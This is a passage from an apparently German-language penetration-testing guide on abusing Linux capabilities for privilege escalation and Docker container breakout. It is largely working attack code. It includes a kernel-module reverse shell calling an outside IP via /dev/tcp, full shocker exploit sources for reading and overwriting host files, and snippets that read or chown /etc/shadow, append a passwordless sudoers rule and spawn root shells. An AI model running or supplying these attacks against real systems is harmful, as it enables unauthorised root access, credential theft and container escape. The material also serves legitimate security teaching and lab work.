Im folgenden Beispiel verfügt die Binärdatei **`python`** über diese Fähigkeit.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Standardmäßig überprüft der Befehl **`modprobe`** Abhängigkeitslisten und Map-Dateien im Verzeichnis **`/lib/modules/$(uname -r)`**.\
Um dies auszunutzen, erstellen wir einen gefälschten **lib/modules**-Ordner:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Dann **kompilieren Sie das Kernel-Modul, das Sie in den beiden folgenden Beispielen finden können, und kopieren Sie** es in diesen Ordner:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Führe schließlich den erforderlichen Python-Code aus, um dieses Kernel-Modul zu laden:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Beispiel 2 mit binary**

Im folgenden Beispiel verfügt das Binary **`kmod`** über diese Capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Das bedeutet, dass der Befehl **`insmod`** zum Einfügen eines Kernelmoduls verwendet werden kann. Folge dem unten stehenden Beispiel, um eine **reverse shell** unter Ausnutzung dieses Privilegs zu erhalten.

**Beispiel mit Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output ist zu sehen, dass die Capability **SYS_MODULE** aktiviert ist.

**Erstelle** das **Kernelmodul**, das eine reverse shell ausführen soll, sowie das **Makefile**, um es zu **kompilieren**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Das Leerzeichen vor jedem `make`-Befehl in der Makefile **muss ein Tabulator und dürfen keine Leerzeichen sein**!

Führe `make` aus, um es zu kompilieren.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Starten Sie schließlich `nc` innerhalb einer Shell, **laden Sie das Modul** aus einer anderen Shell, und Sie erhalten die Shell im nc-Prozess:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Der Code dieser Technik wurde aus dem Labor „Abusing SYS_MODULE Capability“ von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **kopiert.**

Ein weiteres Beispiel für diese Technik ist unter [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) zu finden.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht einem Prozess, **Berechtigungen zum Lesen von Dateien sowie zum Lesen und Ausführen von Verzeichnissen zu umgehen**. Die primäre Verwendung besteht im Suchen oder Lesen von Dateien. Es ermöglicht einem Prozess jedoch auch, die Funktion `open_by_handle_at(2)` zu verwenden, die auf jede Datei zugreifen kann, einschließlich Dateien außerhalb des Mount-Namespace des Prozesses. Der in `open_by_handle_at(2)` verwendete Handle soll eine nicht transparente Kennung sein, die über `name_to_handle_at(2)` abgerufen wird, kann jedoch sensible Informationen wie Inode-Nummern enthalten, die anfällig für Manipulationen sind. Das Ausnutzungspotenzial dieser Capability, insbesondere im Kontext von Docker-Containern, wurde von Sebastian Krahmer mit dem Shocker-Exploit demonstriert und [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analysiert.
**Das bedeutet, dass du** **Dateileseberechtigungsprüfungen sowie Lese-/Ausführungsberechtigungsprüfungen für Verzeichnisse umgehen kannst.**

**Beispiel mit einer Binary**

Die Binary kann jede Datei lesen. Wenn also eine Datei wie tar über diese Capability verfügt, kann sie die Shadow-Datei lesen:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Beispiel mit binary2**

In diesem Fall nehmen wir an, dass das Binary **`python`** über diese Capability verfügt. Um Root-Dateien aufzulisten, könntest du Folgendes ausführen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Und um eine Datei zu lesen, könntest du Folgendes tun:
```python
print(open("/etc/shadow", "r").read())
```
**Beispiel in der Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
In der vorherigen Ausgabe ist zu sehen, dass die **DAC_READ_SEARCH** capability aktiviert ist. Dadurch kann der Container **Prozesse debuggen**.

Wie der folgende Exploit funktioniert, erfahren Sie unter [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3); zusammengefasst erlaubt **CAP_DAC_READ_SEARCH** uns nicht nur, das Dateisystem ohne Berechtigungsprüfungen zu durchlaufen, sondern entfernt auch ausdrücklich alle Prüfungen für _**open_by_handle_at(2)**_ und **könnte unserem Prozess den Zugriff auf sensible Dateien ermöglichen, die von anderen Prozessen geöffnet wurden**.

Der ursprüngliche Exploit, der diese Berechtigungen missbraucht, um Dateien vom Host zu lesen, ist hier zu finden: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c). Das Folgende ist eine **modifizierte Version, mit der Sie die zu lesende Datei als erstes Argument angeben und in eine Datei schreiben können.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Der exploit muss einen Pointer auf etwas finden, das auf dem Host gemountet ist. Der ursprüngliche exploit verwendete die Datei /.dockerinit, und diese modifizierte Version verwendet /etc/hostname. Wenn der exploit nicht funktioniert, musst du möglicherweise eine andere Datei festlegen. Um eine Datei zu finden, die auf dem Host gemountet ist, führe einfach den mount-Befehl aus:

![CAP SYS MODULE - CAP DAC READ SEARCH: Der exploit muss einen Pointer auf etwas finden, das auf dem Host gemountet ist. Der ursprüngliche exploit verwendete die Datei /.dockerinit, und diese modifizierte Version verwendet...](<../../images/image (407) (1).png>)

**Der Code dieser technique wurde aus dem Labor "Abusing DAC_READ_SEARCH Capability" von** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)


## CAP_DAC_OVERRIDE

**Das bedeutet, dass du Berechtigungsprüfungen für das Schreiben in jede Datei umgehen kannst, sodass du jede Datei schreiben kannst.**

Es gibt viele Dateien, die du **überschreiben kannst, um Privilegien zu eskalieren,** [**hier findest du einige Ideen**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit einem Binary**

In diesem Beispiel verfügt vim über diese Capability, sodass du jede Datei wie _passwd_, _sudoers_ oder _shadow_ ändern kannst:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Beispiel mit Binary 2**

In diesem Beispiel verfügt das **`python`**-Binary über diese Capability. Du könntest Python verwenden, um jede Datei zu überschreiben:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Beispiel mit Umgebung + CAP_DAC_READ_SEARCH (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Lies zunächst den vorherigen Abschnitt, der die [**DAC_READ_SEARCH capability missbraucht, um beliebige Dateien**](linux-capabilities.md#cap_dac_read_search) des Hosts zu lesen, und **kompiliere** den Exploit.\
Kompiliere anschließend die **folgende Version des shocker-Exploits**, die es dir ermöglicht, **beliebige Dateien** in das Dateisystem des Hosts zu **schreiben**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Um aus dem Docker-Container auszubrechen, könntest du die Dateien `/etc/shadow` und `/etc/passwd` vom Host **downloaden**, ihnen einen **neuen Benutzer** **hinzufügen** und `**shocker_write**` verwenden, um sie zu überschreiben. Anschließend kannst du per **ssh** **Zugriff** erhalten.

**Der Code für diese Technik wurde aus dem Labor „Abusing DAC_OVERRIDE Capability“ von** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **kopiert.**

## CAP_CHOWN

**Das bedeutet, dass es möglich ist, den Besitzer jeder Datei zu ändern.**

**Beispiel mit einer Binary**

Angenommen, die **`python`**-Binary verfügt über diese Capability. Dann kannst du den **Besitzer** der **`shadow`**-Datei ändern, das **Root-Passwort ändern** und deine Privilegien eskalieren:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Oder mit dem **`ruby`**-Binary, das über diese Capability verfügt:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Das bedeutet, dass die Berechtigungen jeder Datei geändert werden können.**

**Beispiel mit einem binary**

Wenn Python über diese capability verfügt, können die Berechtigungen der shadow-Datei geändert, **das root-Passwort geändert** und die Berechtigungen eskaliert werden:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Dies bedeutet, dass die effektive Benutzer-ID des erstellten Prozesses festgelegt werden kann.**

**Beispiel mit einer Binary**

Wenn Python über diese **Capability** verfügt, kann sie sehr einfach missbraucht werden, um die eigenen Privilegien auf root zu erweitern:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Eine weitere Möglichkeit:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Das bedeutet, dass die effektive Gruppen-ID des erstellten Prozesses festgelegt werden kann.**

Es gibt viele Dateien, die du **überschreiben kannst, um deine Privilegien zu erweitern.** [**Hier findest du einige Ideen dazu**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Beispiel mit einer Binary**

In diesem Fall solltest du nach interessanten Dateien suchen, die eine Gruppe lesen kann, da du dich als jede beliebige Gruppe ausgeben kannst:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sobald du eine Datei gefunden hast, die du zur Privilegieneskalation ausnutzen kannst (durch Lesen oder Schreiben), kannst du mit folgendem Befehl eine **Shell unter der Identität der betreffenden Gruppe** erhalten:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In diesem Fall wurde die Gruppe shadow angenommen, sodass du die Datei `/etc/shadow` lesen kannst:
```bash
cat /etc/shadow
```
### Kombinierte Chain: CAP_SETGID + CAP_CHOWN

Wenn beide Capabilities im selben Helper verfügbar sind, ist folgende praktische Chain möglich:

1. EGID auf `shadow` (oder eine andere privilegierte Gruppe) wechseln.
2. Mit `chown` auf `/etc/shadow` die eigene UID setzen und dabei die Gruppe `shadow` beibehalten.
3. Einen Ziel-Hash auslesen und crack/pivot durchführen.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Dadurch ist kein vollständiger **root**-Zugriff direkt erforderlich, und dies reicht häufig aus, um sich durch die Wiederverwendung von Zugangsdaten weiterzubewegen.

Wenn **docker** installiert ist, könntest du die **docker group** **impersonate** und sie missbrauchen, um mit dem [**docker socket** zu kommunizieren und Privilegien zu eskalieren](#writable-docker-socket).

## CAP_SETFCAP

**Das bedeutet, dass Capabilities für Dateien und Prozesse gesetzt werden können**

**Beispiel mit einer Binary**

Wenn Python über diese **Capability** verfügt, kannst du sie sehr einfach missbrauchen, um Privilegien zu **root** zu eskalieren:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Beachte, dass du diese Capability verlierst, wenn du mit CAP_SETFCAP eine neue Capability für die Binary setzt.

Sobald du über die [SETUID capability](linux-capabilities.md#cap_setuid) verfügst, kannst du den entsprechenden Abschnitt aufrufen, um zu sehen, wie du deine Privilegien eskalierst.

**Beispiel mit einer Umgebung (Docker breakout)**

Standardmäßig wird dem Prozess innerhalb des Containers in Docker die Capability **CAP_SETFCAP** zugewiesen. Du kannst dies überprüfen, indem du Folgendes ausführst:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Diese Capability ermöglicht es, **jeden anderen Capability an Binaries zu vergeben**, daher könnten wir darüber nachdenken, aus dem Container **durch den Missbrauch anderer auf dieser Seite erwähnter Capability-Breakouts zu entkommen**.\
Wenn du jedoch beispielsweise versuchst, dem gdb-Binary die Capabilities CAP_SYS_ADMIN und CAP_SYS_PTRACE zu geben, wirst du feststellen, dass du sie vergeben kannst, das **Binary danach jedoch nicht ausgeführt werden kann**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Aus der Dokumentation](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Dies ist eine **begrenzende Obermenge der effective capabilities**, die der Thread annehmen darf. Sie ist außerdem eine begrenzende Obermenge der capabilities, die von einem Thread, der nicht über die **CAP_SETPCAP**-capability in seiner effective set verfügt, zur inheritable set hinzugefügt werden dürfen._\
Es sieht so aus, als würden die Permitted capabilities diejenigen begrenzen, die verwendet werden können.\
Docker gewährt jedoch standardmäßig auch **CAP_SETPCAP**, sodass möglicherweise **neue capabilities innerhalb der inheritable set gesetzt werden können**.\
In der Dokumentation dieser cap steht jedoch: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
Es sieht so aus, als könnten wir der inheritable set nur capabilities aus der bounding set hinzufügen. Das bedeutet, dass wir keine neuen capabilities wie CAP_SYS_ADMIN oder CAP_SYS_PTRACE in die inheritable set aufnehmen können, um unsere Privilegien zu erweitern.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht eine Reihe sensibler Operationen, darunter den Zugriff auf `/dev/mem`, `/dev/kmem` oder `/proc/kcore`, das Ändern von `mmap_min_addr`, den Zugriff auf die Systemaufrufe `ioperm(2)` und `iopl(2)` sowie verschiedene Festplattenbefehle. Der `FIBMAP ioctl(2)` wird durch diese capability ebenfalls aktiviert, was in der [Vergangenheit](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) zu Problemen geführt hat. Laut der man page ermöglicht diese capability dem Inhaber außerdem, `perform a range of device-specific operations on other devices`.

Dies kann für **privilege escalation** und einen **Docker breakout** nützlich sein.

## CAP_KILL

**Das bedeutet, dass jeder Prozess beendet werden kann.**

**Beispiel mit binary**

Nehmen wir an, das **`python`**-binary verfügt über diese capability. Wenn du außerdem **eine Service- oder Socket-Konfiguration** (oder eine beliebige Konfigurationsdatei, die zu einem Service gehört) ändern könntest, könntest du sie mit einer backdoor versehen, anschließend den mit diesem Service verbundenen Prozess beenden und auf die Ausführung der neuen Konfigurationsdatei mit deiner backdoor warten.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc mit kill**

Wenn du über kill capabilities verfügst und ein **node program** als root (oder als ein anderer Benutzer) läuft, könntest du ihm wahrscheinlich das **signal SIGUSR1** **senden** und es dazu bringen, den **node debugger** zu öffnen, mit dem du dich verbinden kannst.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Das bedeutet, dass es möglich ist, an jedem Port zu lauschen (auch an privilegierten Ports).** Mit dieser Capability können Privilegien nicht direkt eskaliert werden.

**Beispiel mit einer Binärdatei**

Wenn **`python`** über diese Capability verfügt, kann es an jedem Port lauschen und sich sogar von diesem aus mit jedem anderen Port verbinden (einige Services erfordern Verbindungen von Ports mit bestimmten Privilegien).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Die [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)-Fähigkeit erlaubt Prozessen, **RAW- und PACKET-Sockets zu erstellen**, wodurch sie beliebige Netzwerkpakete erzeugen und senden können. Dies kann in containerisierten Umgebungen zu Sicherheitsrisiken führen, etwa durch Packet Spoofing, Traffic Injection und das Umgehen von Netzwerkzugriffskontrollen. Angreifer könnten dies ausnutzen, um das Container-Routing zu stören oder die Netzwerksicherheit des Hosts zu kompromittieren, insbesondere ohne ausreichenden Firewall-Schutz. Außerdem ist **CAP_NET_RAW** für privilegierte Container wichtig, um Vorgänge wie ping über RAW-ICMP-Requests zu unterstützen.

**Das bedeutet, dass Traffic mitgeschnitten werden kann.** Mit dieser Fähigkeit können Privilegien nicht direkt eskaliert werden.

**Beispiel mit einer Binärdatei**

Wenn die Binärdatei **`tcpdump`** über diese Fähigkeit verfügt, kannst du sie verwenden, um Netzwerkinformationen aufzuzeichnen.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Beachte, dass du **`tcpdump`** ebenfalls zum Mitschneiden von Traffic verwenden könntest, wenn die **Umgebung** diese Capability bereitstellt.

**Beispiel mit Binary 2**

Das folgende Beispiel ist **`python2`**-Code, der zum Abfangen von Traffic des "**lo**" (**localhost**)-Interfaces nützlich sein kann. Der Code stammt aus dem Lab "_The Basics: CAP-NET_BIND + NET_RAW_" von [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

